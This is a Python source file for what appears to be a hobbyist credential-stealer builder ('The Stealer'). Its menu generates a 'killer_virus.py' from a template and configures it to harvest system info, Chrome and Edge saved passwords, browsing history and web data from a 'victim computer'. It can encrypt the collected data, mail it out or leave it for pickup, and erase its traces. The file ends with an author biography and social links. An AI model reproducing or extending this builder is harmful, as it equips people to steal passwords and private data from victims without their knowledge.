import socket ; import os;import time;import json
from termcolor import colored
import webbrowser

# =====>paths list <=========================
root_path='C:\\Users\\Public\\akki'
main_path=root_path+'\\The_stealer'
dev_resorse=main_path+'\\dev_path'
# ['info_mv.json','row_virus.txt']
info_resorse=main_path+'\\info_path'
list_dir=os.listdir(info_resorse)
#info_resorse==>name==>database,collected_data
def format_printing(header:str='None',main:str='None',footer:str='None',header_color:str='white',main_color:str='white',footer_color:str='white',seprater:str=',',main_indent:int=25,header_footer_indent:int=17):
    """
    Function to print formatted text with options for header, main text, footer,
    colors, indentation, and separator.

    Arguments:
    header (str): Header text separated by the specified separator.
    main (str): Main text separated by the specified separator.
    footer (str): Footer text separated by the specified separator.
    header_color (str): Color for the header text.
    main_color (str): Color for the main text.
    footer_color (str): Color for the footer text.
    main_indent (int): Indentation for the main text.
    header_footer_indent (int): Indentation for the header and footer text.
    separator (str): Separator used to split the input text.
    """
    if not header=='None':
        header=header.split(seprater)
        for i in header:print(colored(' '*header_footer_indent+i,header_color,attrs=['bold']))
    if not main=='None':
        main=main.split(seprater)
        for i in main:print(colored(' '*main_indent+i,main_color))
    if not footer=='None':
        footer=footer.split(seprater)
        for i in footer:print(colored(' '*header_footer_indent+i,footer_color))
def creeating_path(info_mv_path,info_resorse_path:str):
    '''this will create path and return the name of path if path already exist then return None
    ask for attack name t create path and target name takes 2 argument 
    1. info_mv_path --> mv_path where it's save names
    2. info_resorse_path --> the path where dir have to be made '''
    with open(info_mv_path,'r')as file:
        info_collected=json.load(file);file.close()
        attack_name_list=info_collected['name_of_attacks']
    list_dir=os.listdir(info_resorse)
    name_of_attack=input(' '*17+colored('what you wanna give it a name of attack? ','yellow'))
    per_name=input(' '*17+colored('enter the target name :  ','yellow'))
    if name_of_attack in list_dir:
        print(' '*17+colored('name_already_exist','red'))
        return None
    elif not name_of_attack in list_dir:
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir')
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir'+'\\database')
        os.mkdir(info_resorse_path+'\\'+name_of_attack+'dir'+'\\collected_data')
        attack_name_list[name_of_attack]=per_name
        print(' '*17+colored('direrctory created with name','light_blue')+colored(name_of_attack,'blue'))
        nothing=input(' '*17+colored('tap anything to continue','yellow'))
        with open(info_mv_path,'w')as file:
            info_collected['name_of_attacks']=attack_name_list
            json.dump(info_collected,file);file.close()
        return name_of_attack
    else:
        print(' '*17+colored('unexpected-error- type the name_of_attack_again_',color='red'))
        return None
def skull_img(clear=False,level_2=False):
    '''it's logo of this software take areguments 
    clear this argument clear all the previous text and after that print skull
    level2 this is a text of create virus secoend level'''
    os.system('cls')if clear else None
    print(colored('                             _,.-------.,_','red',attrs=['bold']))
    print(colored('                           ,-~             ~-.','red',attrs=['bold']))
    print(colored('                        ,^___             ___^.','red',attrs=['bold']))
    print(colored('                        /~"   ~"   .   "~   "~\\','red',attrs=['bold']))
    print(colored('                      Y  ,---._    I    _.---.  Y','red',attrs=['bold']))
    print(colored('                      | Y      ~-. | ,-~      Y | ','red',attrs=['bold']))
    print(colored('                      | |         }:{         | |','red',attrs=['bold']))
    print(colored('                      | |         }:{         | |','red',attrs=['bold']))
    print(colored('                      j l        / | \        ! l','red',attrs=['bold']))
    print(colored('                   .-~  (___,.--" .^. "--.,___)  ~-.','red',attrs=['bold']))
    print(colored('                  (            / / | \ \            )','red',attrs=['bold']))
    print(colored('                   \._____,   ~  \/"\/  ~   ._____,/','red',attrs=['bold']))
    print(colored('                    ^.____                   ____.^','red',attrs=['bold']))
    print(colored('                       | |T ~\   !   !   /~ T| |','red',attrs=['bold']))
    print(colored('                       | |l    _ _ _ _ _    !| |','red',attrs=['bold']))
    print(colored('                       | l \ /V V V V V V\ / j |','red',attrs=['bold']))
    print(colored('                       l  \ \ |_|_|_|_|_|/  /  !','red',attrs=['bold']))
    print(colored('                        \  \ [T T T T T TI /  /','red',attrs=['bold']))
    print(colored("                         \   `^-^-^-^-^-^'   /",'red',attrs=['bold']))
    print(colored('                          \                 / ','red',attrs=['bold']))
    print(colored('                           \.             ,/','red',attrs=['bold']))
    print(colored('                            "^-. ______,-^"\n\n','red',attrs=['bold']))
    if level_2:
        print(colored(' '*14+'step two begin__ customaizing the stealer.py fille_'.center(54),color='blue'))
def check_internet_connection():
    '''check internet conection and return True if internet is conected else False'''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect(("www.google.com", 80))
        return True
    except socket.error:
        return False
    finally:
        sock.close()
def response1():
    '''it's ask if the virus has to be made offline or online return True and False'''
    while True:
        skull_img(clear=True)
        format_printing(header='what kind of virus you wawnna make?',header_color='yellow',main='[1]offline,[2]online,[3]help',main_color='blue',main_indent=30)
        if (respnse:=input(colored(' '*19+'your response here 1/2/3  ',color='light_red')))=='1':return False
        elif respnse=='2':
            if check_internet_connection():print(colored(' '*19+'internet is conected','blue'));return True
            else:print(colored(' '*17+'internt is not conected wanna try again',color='red'))
        elif respnse=='3':print(colored('explnation','green'))
        else:print(colored(' '*19+'type only given in the oprtions',color='black'))
        nothing=input()
def creating_virus(type_of_virus:bool,path_of_rowvirus:str,target_path:str):
    '''it's create the virus and return noting it's take 3 argument:-
    1. type of virus:      define virus shoude be offline or online
    2. path of row virus:  ask for the path where row virus has been writen
    3. target path :       where virus has to be save after creating'''
    while True:
        true_false=true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'',True]
        skull_img(clear=True,level_2=True)
        nothing=input()
        print(colored('do you wanna change the storing directory in victim computer (default value C:\\Users\\Public) ','yellow'))
        if input(colored('WARNING/!\\ : if the dir path is wrong code wont run and coude couse error: y/n  ',color='red')).lower()=='y':
            true_false[0]=input(' '*17+colored('enter the dir: ','blue'))
        else:pass
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect system info ex- ip  y/n ','yellow')).lower()=='y':pass
        else:true_false[1]=False
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect chrome data  y/n ','yellow')).lower()=='y':pass
        else:true_false[2]=False
        if true_false[2]:
            if input(' '*15+colored('do you wanna collect chrome basic info  y/n ','blue')).lower()=='y':pass
            else:true_false[3]=False
            if input(' '*15+colored('do you wanna collect chrome id passwords  y/n ','blue')).lower()=='y':pass
            else:true_false[4]=False
            if input(' '*15+colored('do you wanna colect chrome web data (tell about person interst)  y/n ','blue')).lower()=='y':pass
            else:true_false[5]=False
            if input(' '*15+colored('do you wanna collect chrome history data  y/n','blue')).lower()=='y':pass
            else:true_false[6]=False
        else:pass
        skull_img(clear=True,level_2=True)
        if input(' '*15+colored('do you wanna collect edge data(edge_bais info,edge default id password) y/n ','yellow')).lower()=='y':pass
        else:true_false[7]=False
        skull_img(clear=True,level_2=True)
        if input(colored('do you wanna encrypt all data you collectd (!its incresse the size of file 2.5x).recomanded  y/n ','yellow')).lower()=='y':pass
        else:true_false[8]=False
        skull_img(clear=True,level_2=True)
        if input(' '*17+colored(' you wanna leave any meassage? y/n ','yellow')).lower()=='y':true_false[10]=input(' '*17+colored('message you wanna show ? ',color='blue'))
        else:true_false[9]=False
        if type_of_virus:true_false[11]=True
        else:true_false[11]=False
        if input(colored('if there is any option you selected wrong you can file form again do you wanna fill form again?  y/n','red')).lower()=='y':pass
        else:break
    with open(path_of_rowvirus,'r+')as vr:
        virus_row=vr.read()
        xx=virus_row.index('true_false')
        created_virus=virus_row[0:+xx+11]+str(true_false)+virus_row[xx+13:]
    with open(target_path+'\\database\\killer_virus.py','x') as kipy:kipy.write(created_virus);kipy.close()
    skull_img(True)
    print(colored('virus has been created in this directory:-','yellow'),colored(target_path+'\\database\\killer_virus.py','blue'))
    print(colored('\nat first copy both bat and py fille in same directory in victim computer\nthen run bat fille first and leave the rest work on the code :)','light_blue'))
    if type_of_virus:
        print(colored('virus will send the all file in the given mail address just','blue'),colored('collect it before 24hours from ur computer','red'))
    else:
        print(colored('wait few minutes and after that copy the filles from victim devies by given path or default path("C:\\Users\\Public") and put it in your devies and you done... ','blue'))
        print(colored('and after 2 min code will remove its self all the trase and after that','blue'),colored('run data_stabalizer.py in your computer for setup data in directory','yellow'))
    nothing=input(colored('tap anything to continue','light_yellow'))
print(colored('===++=== ||  || ||===     ||===  ===++===  ||===     /=\\     ||     ||=== ||===||','yellow'))
print(colored('   ||    ||  || ||        ||        ||     ||       // \\\\    ||     ||    ||   ||','yellow'))
print(colored('   ||    ||==|| ||==      \\\\=\\\\     ||     ||==    //===\\\\   ||     ||==  ||===||','yellow'))
print(colored('   ||    ||  || ||           ||     ||     ||     //     \\\\  ||     ||    ||\\\\','yellow'))
print(colored('   ||    ||  || ||===     ===||     ||     ||=== //       \\\\ ||===  ||=== || \\\\','yellow'))
print(colored('                                                                  made by akki(akhand)','blue'))
print(colored('about the software \nenter anything to continue','white'))
nothing=input();os.system('cls')
while True:
    skull_img(clear=True)
    format_printing(header='what you planning to do______________?',main='[1]making virus,[2]collecting data,[3]viewing data,[4]about devloper,[5]exit the program',header_color='yellow',main_color='light_blue')
    response=input(colored(' '*19+'enter your response here','light_red'))
    if response=='1':
        internt_usees=response1()
        skull_img(True)
        while not bool(target_namae:=creeating_path(dev_resorse+'\\info_mv.json',info_resorse)):pass
        print('first_step_compleated')
        creating_virus(internt_usees,dev_resorse+'\\row_virus.txt',info_resorse+'\\'+target_namae+'dir')
    elif response=='2':
        pass
    elif response=='3':
        pass
    elif response=='4':
        while True:
            os.system('cls')
            main_content=",hey akki here i am 18 year old guy just turnd 18 this year 1st jan i am glab that you reading about me ammm.....,so i wrote this code becouse i was watching mr robort and i thoght i coude make something too i know it's not that good but i made it, ,so i am just an normal boy who have a lot of goals and dream like opening my own company but main goal is to get,job in google yes that's my dying wish to achive and amm i have a lot of hobbies hee like chess  archary  reading books,coding and yes python is my first love and yes i am single and yes i am hopeing to find gf from here haahahahhahahah,ammmm there is more i like i know mobile reparing i did job to for 2 year after learing i am so good at that and ,it's best job tbh all u have to do is seat and just yes start reparning which takes time but fun hee hee and that's it ,i only have 1friend so yes i am hoping to find friend from here tooo and i like skeching i woude love to show u my, sketch trust me that's so good also my goal is to go new yurk also this year just for 2 months i did job as an it ,teacher in n institute where i was studying becouse they like me tho but i was not able to maintain coding study ,and me time with job so i left hee hee lol what can i say more idk i don't even understand my self preety well becouse, of Derealization Disorder amm..yes i want to learn languages currently learning spanish,"
            format_printing(header='About Akki [akhand raj ]',main=main_content,footer='my socsial media ----->,[1]instagam - personal -> @akk_raj_._,[2]instagram - public -> @its_just_me_akki,[3]git_hub --> Akkiraj1234,[4]"exit"',main_indent=0,main_color='blue',footer_color='yellow',header_color='yellow',header_footer_indent=0)
            response=input('ENTER YOUR RESPONSE HERE:--->   ')
            if response.lower()=='1':print('link opening--> instagram-> @akki_raj_._ ');time.sleep(1);webbrowser.open("https://www.instagram.com/akki_raj_._/")
            elif response.lower()=='2':print('link opening--> instagram-> @its_just_me_akki');time.sleep(1);webbrowser.open("https://www.instagram.com/its_just_me_akki/")
            elif response.lower()=='3':print('link opening--> github-> Akkiraj1234 ');time.sleep(1);webbrowser.open("https://github.com/Akkiraj1234")
            elif response.lower()=='4':break
            else:input(colored('you typed something wrong','red'))
    elif response=='5':
        if input(' '*15+colored('you sure you wanna exist the code? y/n','light_red')).lower()=='y':break
        else:pass
    else:
        nothing=input(colored('you may type something else type something from given option tap enter to continue','red'))